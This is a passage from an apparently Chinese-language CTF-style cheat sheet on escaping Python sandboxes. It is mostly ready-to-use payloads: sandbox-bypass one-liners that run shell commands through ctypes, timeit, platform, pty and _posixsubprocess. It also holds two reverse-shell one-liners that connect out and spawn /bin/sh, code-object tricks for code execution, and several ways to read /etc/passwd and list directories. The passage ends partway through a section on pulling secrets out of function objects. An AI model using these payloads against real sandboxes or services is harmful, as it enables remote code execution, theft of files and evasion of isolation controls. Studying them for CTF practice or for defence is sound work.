 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前进程已加载的 libc</span></span><br><span class="line">libc = ctypes.CDLL(<span class="literal">None</span>)  </span><br><span class="line">libc.system(<span class="string">b&#x27;ls ./&#x27;</span>)      <span class="comment"># 注意传入字节串</span></span><br></pre></td></tr></table></figure></div>

<p>或者更稳妥（显式加载 libc）：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes, ctypes.util</span><br><span class="line">libc = ctypes.CDLL(ctypes.util.find_library(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">libc.system(<span class="string">b&#x27;ls /&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>沙箱中可以这么用：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br></pre></td></tr></table></figure></div>

<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>Windows 上 <code>ctypes.CDLL(None)</code> 不可用，<code>system</code> 在 MSVCRT 或 UCRT 库中。</p>
<blockquote>
<p>在 <strong>POSIX 系统</strong>（Linux&#x2F;macOS）里，<code>CDLL(None)</code> 会让 <code>ctypes</code> 调用底层的 <code>dlopen(NULL, flags)</code>。<code>dlopen(NULL, ...)</code> 的语义是：返回当前进程已经加载的主程序（和它依赖的库）的符号表。</p>
<p>Windows 下 <code>ctypes.CDLL</code> 底层调用的是 <code>LoadLibrary()</code>（或 <code>LoadLibraryEx()</code>）。传 <code>None</code> 相当于 <code>LoadLibrary(NULL)</code>，而在 Windows API 里：<code>NULL</code> <strong>不是</strong> “当前进程的符号表”，而是被当成一个无效指针 → 导致 <code>ctypes</code> 内部想解析路径时报错（你看到的 <code>TypeError: argument of type &#39;NoneType&#39; is not iterable</code> 就是这里触发的）</p>
<p>Windows 如果你想拿到“当前进程已加载的模块”，得用 <code>GetModuleHandle()</code>，而且要传一个已经加载的 DLL 名，比如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">handle = ctypes.windll.kernel32.GetModuleHandleW(<span class="string">&quot;msvcrt.dll&quot;</span>)</span><br></pre></td></tr></table></figure></div>
</blockquote>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式 1：ANSI 版本（字节串）</span></span><br><span class="line">msvcrt = ctypes.CDLL(<span class="string">&#x27;msvcrt&#x27;</span>)         <span class="comment"># 或 &#x27;ucrtbase&#x27;</span></span><br><span class="line">msvcrt.system(<span class="string">b&#x27;cmd /c dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式 2：Unicode 版本（字符串）</span></span><br><span class="line">ucrt = ctypes.CDLL(<span class="string">&#x27;ucrtbase&#x27;</span>)</span><br><span class="line">ucrt._wsystem.argtypes = [ctypes.c_wchar_p]</span><br><span class="line">ucrt._wsystem(<span class="string">&quot;cmd /c dir&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>沙箱绕过写法：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="string">&#x27;msvcrt&#x27;</span>).system(<span class="string">b&#x27;cmd /c dir&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="timeit-模块"><a href="#timeit-模块" class="headerlink" title="timeit 模块"></a>timeit 模块</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="platform-模块"><a href="#platform-模块" class="headerlink" title="platform 模块"></a>platform 模块</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">platform.os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="pty-模块"><a href="#pty-模块" class="headerlink" title="pty 模块"></a>pty 模块</h3><p>仅限 Linux 环境</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="posixsubprocess-模块"><a href="#posixsubprocess-模块" class="headerlink" title="_posixsubprocess 模块"></a>_posixsubprocess 模块</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>

<p>结合 <code>__loader__.load_module(fullname)</code> 导入模块</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).socket(<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).AF_INET,<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));[<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).dup2(s.fileno(),i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)];<span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="构造代码对象进行-RCE"><a href="#构造代码对象进行-RCE" class="headerlink" title="构造代码对象进行 RCE"></a>构造代码对象进行 RCE</h3><p><strong><code>CodeType</code></strong> 是 Python 内置的代码对象类型，表示编译后的字节码（由 <code>compile()</code> 生成）。所有函数的 <code>__code__</code> 属性就是一个 CodeType 对象。CodeType 中包含了：</p>
<ul>
<li><code>co_code</code>：字节码指令</li>
<li><code>co_consts</code>：常量池</li>
<li><code>co_names</code>：全局变量名</li>
<li><code>co_varnames</code>：局部变量名</li>
<li>以及堆栈大小、参数个数、调试信息等</li>
</ul>
<p>Python 不允许直接修改 <code>code.co_code</code> 等属性（只读）。但是：</p>
<ul>
<li>可以给函数直接换一个新的 <code>__code__</code> 对象。</li>
<li>可以构造新的 CodeType 对象（或者用 <code>replace()</code> 修改），实现任意指令注入。</li>
<li>可以用 <code>exec()</code> 或 <code>types.FunctionType()</code> 直接运行这个 CodeType 对象。</li>
</ul>
<p>因此我们可以通过 <code>CodeType</code> 进行 RCE。</p>
<h4 id="执行-CodeType-对象"><a href="#执行-CodeType-对象" class="headerlink" title="执行 CodeType 对象"></a>执行 CodeType 对象</h4><p>有两种方式可以执行代码对象：</p>
<ul>
<li><p>方法 1：exec 模式</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(read.__code__, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: __builtins__&#125;)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>方法 2：FunctionType 包装</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">fn = types.FunctionType(read.__code__, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: __builtins__&#125;)</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="替换函数的-code"><a href="#替换函数的-code" class="headerlink" title="替换函数的 code"></a>替换函数的 code</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">target</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">target.__code__ = read.__code__</span><br><span class="line">target()  <span class="comment"># 相当于执行 read()</span></span><br></pre></td></tr></table></figure></div>

<h4 id="构造新的-CodeType-对象"><a href="#构造新的-CodeType-对象" class="headerlink" title="构造新的 CodeType 对象"></a>构造新的 CodeType 对象</h4><p>不同版本 <code>CodeType</code> 的构造参数不同：</p>
<ul>
<li><strong>Python ≤ 3.7</strong>：参数少（无 <code>posonlyargcount</code> &#x2F; <code>qualname</code>）。</li>
<li><strong>Python 3.8</strong>：新增 <code>posonlyargcount</code>，并引入 **<code>code.replace()</code>**。</li>
<li><strong>Python 3.11</strong>：结构改动大，引入 <code>co_linetable</code>、<code>co_exceptiontable</code>。</li>
</ul>
<p>查看当前版本需要的参数：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="built_in">help</span>(types.CodeType)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>手动构造（不推荐，容易踩版本坑），以 Python 3.11 为例：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">c = read.__code__</span><br><span class="line">CodeType = <span class="built_in">type</span>(c)</span><br><span class="line"></span><br><span class="line">codeobj = CodeType(</span><br><span class="line">    c.co_argcount, c.co_posonlyargcount, c.co_kwonlyargcount,</span><br><span class="line">    c.co_nlocals, c.co_stacksize, c.co_flags,</span><br><span class="line">    c.co_code, c.co_consts, c.co_names, c.co_varnames,</span><br><span class="line">    c.co_filename, c.co_name, c.co_qualname,</span><br><span class="line">    c.co_firstlineno, c.co_linetable, c.co_exceptiontable,</span><br><span class="line">    c.co_freevars, c.co_cellvars</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(codeobj, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: __builtins__&#125;)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>用 replace（推荐，3.8+）</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">new_code = read.__code__.replace(</span><br><span class="line">    co_consts=read.__code__.co_consts + (<span class="string">&#x27;/etc/passwd&#x27;</span>,)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">exec</span>(new_code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: __builtins__&#125;)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>用 compile 直接生成 CodeType</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload_code = <span class="built_in">compile</span>(<span class="string">&#x27;print(open(&quot;/etc/passwd&quot;).read())&#x27;</span>, <span class="string">&#x27;&lt;x&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(payload_code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: __builtins__&#125;)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><h3 id="file-类"><a href="#file-类" class="headerlink" title="file 类"></a>file 类</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python2 </span></span><br><span class="line">file(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br><span class="line"><span class="comment">#注意：该函数只存在于Python2，Python3不存在</span></span><br></pre></td></tr></table></figure></div>

<h3 id="open-函数"><a href="#open-函数" class="headerlink" title="open 函数"></a>open 函数</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;builtins&quot;</span>).<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>

<h3 id="codecs-模块"><a href="#codecs-模块" class="headerlink" title="codecs 模块"></a>codecs 模块</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.<span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>

<h3 id="get-data-函数"><a href="#get-data-函数" class="headerlink" title="get_data 函数"></a>get_data 函数</h3><p>FileLoader 类</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _frozen_importlib_external.FileLoader.get_data(0,&lt;filename&gt;)</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">91</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>相比于获取 <code>__builtins__</code> 再使用 open 去进行读取,使用 get_data 的 payload 更短.</p>
<h3 id="linecache-模块"><a href="#linecache-模块" class="headerlink" title="linecache 模块"></a>linecache 模块</h3><p>getlines 函数</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> linecache</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>linecache.getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&quot;linecache&quot;</span>).getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>getline 函数需要第二个参数指定行号</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;linecache&quot;</span>).getline(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="license-函数"><a href="#license-函数" class="headerlink" title="license 函数"></a>license 函数</h3><p>在 Python 里，<code>license</code> 不是字符串，而是一个特殊对象：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(license)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Printer&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>它是 <code>_sitebuiltins._Printer</code> 类的实例，平时你直接输入 <code>license()</code>，它会打印 Python License 信息。</p>
<p>这个 <code>_Printer</code> 类的核心逻辑为：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.license._Printer__filenames</span><br><span class="line">[<span class="string">&#x27;/usr/lib/python3.10/../LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.10/../LICENSE&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.10/LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.10/LICENSE&#x27;</span>, <span class="string">&#x27;./LICENSE.txt&#x27;</span>, <span class="string">&#x27;./LICENSE&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<ul>
<li>它内部有一个 <code>_Printer__filenames</code> 列表，里面是要显示的文件路径（通常是 Python 自带的 LICENSE 文本）。</li>
<li>调用这个对象时（<code>license()</code>），它会按 <code>_Printer__filenames</code> 里的路径读取文件并输出。</li>
</ul>
<p>如果我们能够修改 <code>_Printer__filenames</code> 文件列表就能任意读，例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames = [<span class="string">&quot;/etc/passwd&quot;</span>]</span><br></pre></td></tr></table></figure></div>

<p>这样一来，如果执行 <code>license()</code>，它就会打开 <code>/etc/passwd</code> 并打印出来。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">license()  <span class="comment"># 会打印 /etc/passwd</span></span><br></pre></td></tr></table></figure></div>

<h2 id="枚举目录"><a href="#枚举目录" class="headerlink" title="枚举目录"></a>枚举目录</h2><h3 id="os-模块-1"><a href="#os-模块-1" class="headerlink" title="os 模块"></a>os 模块</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="glob-模块"><a href="#glob-模块" class="headerlink" title="glob 模块"></a>glob 模块</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line">glob.glob(<span class="string">&quot;f*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;glob&#x27;</span>).glob(<span class="string">&quot;f*&quot;</span>) </span><br></pre></td></tr></table></figure></div>

<h2 id="获取函数信息"><a href="#获取函数信息" class="headerlink" title="获取函数信息"></a>获取函数信息</h2><p>python 中的每一个函数对象都有一个 <code>__code__</code> 属性.这个<code>__code__</code> 属性就是上面的代码对象，存放了大量有关于该函数的信息.</p>
<p>假设上下文存在一个函数</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">some_input</span>):</span><br><span class="line">    var1=<span class="number">1</span></span><br><span class="line">    var2=<span class="string">&quot;secretcode&quot;</span></span><br><span class="line">    var3=[<span class="string">&quot;some&quot;</span>,<span class="string">&quot;array&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> some_input == var2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;THIS-IS-THE-FALG!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nope&quot;</span></span><br></pre></td></tr></table></figure></div>

<p><code>__code__</code> 属性包含了诸多子属性,这些子属性用于描述函数的字节码对象,下面是对这些属性的解释：</p>
<ul>
<li><code>co_argcount</code>: 函数的参数数量，不包括可变参数和关键字参数。</li>
<li><code>co_cellvars</code>: 函数内部使用的闭包变量的名称列表。</li>
<li><code>co_code</code>: 函数的字节码指令序列，以二进制形式表示。</li>
<li><code>co_consts</code>: 函数中使用的常量的元组，包括整数、浮点数、字符串等。</li>
<li><code>co_exceptiontable</code>: 异常处理表，用于描述函数中的异常处理。</li>
<li><code>co_filename</code>: 函数所在的文件名。</li>
<li><code>co_firstlineno</code>: 函数定义的第一行所在的行号。</li>
<li><code>co_flags</code>: 函数的标志位，表示函数的属性和特征，如是否有默认参数、是否是生成器函数等。</li>
<li><code>co_freevars</code>: 函数中使用的自由变量的名称列表，自由变量是在函数外部定义但在函数内部被引用的变量。</li>
<li><code>co_kwonlyargcount</code>: 函数的关键字参数数量。</li>
<li><code>co_lines</code>: 函数的源代码行列表。</li>
<li><code>co_linetable</code>: 函数的行号和字节码指令索引之间的映射表。</li>
<li><code>co_lnotab</code>: 表示行号和字节码指令索引之间的映射关系的字符串。</li>
<li><code>co_name</code>: 函数的名称。</li>
<li><code>co_names</code>: 函数中使用的全局变量的名称列表。</li>
<li><code>co_nlocals</code>: 函数中局部变量的数量。</li>
<li><code>co_positions</code>: 函数中与位置相关的变量（比如闭包中的自由变量）的名称列表。</li>
<li><code>co_posonlyargcount</code>: 函数的仅位置参数数量。</li>
<li><code>co_qualname</code>: 函数的限定名称，包含了函数所在的模块和类名。</li>
<li><code>co_stacksize</code>: 函数的堆栈大小，表示函数执行时所需的堆栈空间。</li>
<li><code>co_varnames</code>: 函数中局部变量的名称列表。</li>
</ul>
<p>下面是一些使用示例:</p>
<h3 id="获取源代码中的常量"><a href="#获取源代码中的常量" class="headerlink" title="获取源代码中的常量"></a>获取源代码中的常量</h3><p>可以使用 <code>__code__.co_consts</code> 这种方法进行获取, co_consts 可以获取常量.</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_consts</span><br><span class="line">(<span class="literal">None</span>, <span class="number">1</span>, <span class="string">&#x27;secretcode&#x27;</span>, <span class="string">&#x27;some&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;THIS-IS-THE-FALG!&#x27;</span>, <span class="string">&#x27;Nope&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="获取变量"><a href="#获取变量" class="headerlink" title="获取变量"></a>获取变量</h3><p>则可以使用如下的 payload 获取 get_flag 函数中的变量信息</p>
